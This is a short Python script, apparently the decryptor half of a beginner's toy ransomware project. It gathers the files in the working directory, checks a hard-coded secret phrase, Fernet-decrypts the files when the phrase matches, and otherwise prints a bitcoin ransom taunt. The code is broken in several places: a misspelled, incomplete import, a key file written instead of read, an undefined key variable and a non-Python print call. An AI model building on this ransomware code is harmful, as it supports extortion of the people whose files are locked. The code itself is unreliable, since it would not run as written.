import os

from cyptography.fernet import 

#finding files

files =[]

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file =="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	thekey.write(key)

secretphrase ="Lincoln"

user_phrase = input("Enter the secret phrase to decrypt your files \n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats, your files are decrypted")
else: 
   println("Sorry wrong phrase, need mroe bitcoin") 



